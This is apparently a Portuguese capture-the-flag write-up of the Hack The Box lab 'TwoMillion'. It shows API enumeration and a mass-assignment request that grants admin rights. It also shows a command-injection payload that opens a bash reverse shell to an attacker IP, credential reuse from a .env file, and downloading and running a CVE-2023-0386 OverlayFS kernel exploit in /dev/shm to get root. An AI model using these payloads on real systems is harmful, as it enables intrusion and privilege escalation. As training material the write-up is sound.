# Write-up: TwoMillion - Hack The Box

> **Data:** 07 de Março de 2026  
> **Target IP:** `10.10.11.221` 


<p align="left">
  <img src="https://img.shields.io/badge/STATUS-COMPROMETIMENTO%20TOTAL-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/INITIAL%20ACCESS-COMMAND%20INJECTION-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/PRIVESC-CVE--2023--0386%20(OVERLAYFS)-blue?style=for-the-badge">
</p>

O desafio **TwoMillion** é um laboratório focado em reconhecimento de APIs, manipulação de requisições web e exploração de falhas de Kernel no Linux, testando a capacidade de contornar restrições de ambiente.

---

## 1. Reconhecimento

Iniciei a varredura de portas de forma rápida utilizando o **Rustscan**, passando as flags do Nmap para enumerar serviços e versões das portas abertas:

```bash
rustscan -a 10.10.11.221 -- -sV -sC -A
```

**Vetores Identificados:**
* **Porta 22 (SSH):** OpenSSH 8.9p1 Ubuntu.
* **Porta 80 (HTTP):** Apache 2.4.52 rodando a antiga interface web do Hack The Box.

---

#### Adicione o IP no /etc/hosts para o site carregar corretamente:
```bash
echo "10.129.2.3  2million.htb" | sudo tee -a /etc/hosts
```


### 1.1 Exploração de API

Acessando o siste, constatei que exigia um código de convite para criar uma conta. Inspecionando, encontrei a importação do script `/js/inviteapi.js`.

Executei a função `makeInviteCode()` no console retornando o seguinte JSON:
```bash
{"data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", "enctype": "ROT13"}
```
- ROT13: É uma cifra de substituição simples. Traduzindo a mensagem acima, ela diz: "In order to generate the invite code, make a POST request to /api/v1/invite/generate".

- Fiz uma requisição POST via curl:
```
curl -X POST http://2million.htb/api/v1/invite/generate
```
Recebendo de volta um código em base64.
Usando o comando para decodificar:
```bash
echo "MOLVTFot0E5aVlEtMlpLMEgtWVBZS0E=" | base64 -d
3IULZ-8NZVQ-2ZKOH-YPΥΚΑ
```

---

## 2. Escalação de Privilégios Web

Registrei-me na plataforma e iniciei a enumeração de API utilizando o burp, realizando um GET no endpoint `/api/v1` que retornou um JSON listando todas as rotas do sistema.

Identifiquei a rota administrativa `/api/v1/admin/settings/update`. Ainda no Burp Suite, explorei uma falha de Mass Assignment enviando um PUT para elevar os privilégios da minha própria conta:

```
{
  "email": "ralph@teste.com.br",
  "is_admin": 1
}
```
A requisição foi aceita com sucesso e minha conta foi promovida a administrador da aplicação web.


## 3. Acesso Inicial
Com privilégios administrativos, ganhei acesso à rota `/api/v1/admin/vpn/generate`. Interceptando a requisição com o Burp Suite, percebi que a aplicação recebia o parâmetro username em JSON e o passava diretamente para um comando no backend, sem sanitização **Command Injection**.

Antes, abri o **nc** para a escuta e recebimento do Shell:
```
nc -lnvp 4444
```
No Burp Suite, alterei o payload JSON injetando a shell reversa no campo username:
Payload para obter a Shell Reversa:
```
{
  "username": "ralph\nbash -c 'bash -i >& /dev/tcp/10.10.14.186/4444 0>&1'"
}
```
Enviei a requisição e a quebra de linha forçou o backend a executar a minha chamada do bash. Recebi a conexão de volta no Netcat. Acesso inicial obtido como o usuário `www-data`.

## 4. Movimentação Lateral
Já na máquina alvo como www-data, realizei a enumeração local no diretório da aplicação `/var/www/html`. Localizei o arquivo oculto `.env`, que continha as credenciais do banco de dados. Vou reutilizar essa credencial para logar via SSH.
```
ssh admin@2million.htb
```

- Agora que estou logado e sou admin, posso ir buscar a primeira flag do usuário.


## 5. Escalada de Privilégios

Enumeração interna do sistema:
* Na raiz da aplicação web, encontrei o arquivo `.env` contendo credenciais de banco de dados.
* Verificando os e-mails do sistema em `/var/mail/admin`, li uma mensagem do usuário **ch4p** indicando que o Kernel estava desatualizado e vulnerável a falhas no **OverlayFS**.

Verificando a versão do Kernel `uname -a`, constatei que o sistema rodava a versão **5.15.70**, vulnerável ao **CVE-2023-0386**.

- Desafio do Filesystem (/tmp)

Iniciei a tentativa de exploração transferindo os arquivos do exploit em C para o diretório `/tmp`. No entanto, ao tentar compilar e alterar permissões, o Kernel bloqueou a execução com o erro:
`chmod: changing permissions: Operation not permitted`.

Isso ocorreu porque o diretório `/tmp` do alvo estava montado com restrições `noexec` e o Kernel moderno do Ubuntu bloqueou a manipulação de metadados das camadas Overlay naquela partição.

- A Solução: Exploração via /dev/shm

Para contornar as restrições, movi minha área de trabalho para a memória RAM compartilhada do sistema `/dev/shm`, que permite execução e não sofre com as mesmas travas do disco.

Transferi os arquivos do exploit (baseado na biblioteca **FUSE**) do meu Kali para o alvo via servidor Python:

```bash
cd /dev/shm
mkdir root_exploit && cd root_exploit
wget [http://10.10.14.189/exp.c](http://10.10.14.189/exp.c)
wget [http://10.10.14.189/fuse.c](http://10.10.14.189/fuse.c)
wget [http://10.10.14.189/getshell.c](http://10.10.14.189/getshell.c)
wget [http://10.10.14.189/Makefile](http://10.10.14.189/Makefile)
```

Com os arquivos limpos na memória RAM, compilei e executei o exploit:

```bash
make
./exp
```

**Resultado:**
O exploit utilizou o FUSE para simular um sistema de arquivos, forçando o OverlayFS a realizar um *copy-up* vulnerável. Isso gerou um executável com o bit **SUID** ativado. A execução resultou no prompt de Root imediato.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

 *Conclusão:*

  Obtendo todas as FLAGS, finalizei a máquina com sucesso!  🚩

* **User.txt:** `[*******************]`
* **Root.txt:** `[*******************]`

O laboratório reforça a importância de ferramentas de proxy como o **Burp Suite** para descobrir injeções invisíveis no front-end, além de demonstrar que restrições locais de Kernel e partições (como no `/tmp`) exigem adaptação e conhecimento da arquitetura do Linux, utilizando recursos como o `/dev/shm`.

<br>

<div align="center">
  <p>Escrito por:</p>
  <a href="SEU_LINK_LINKEDIN"><img src="https://img.shields.io/badge/LinkedIn-Ralph_Sonato-0e76a8?style=for-the-badge&logo=linkedin&logoColor=white"></a>
  <p><i>Analista de Cibersegurança</i></p>
</div>
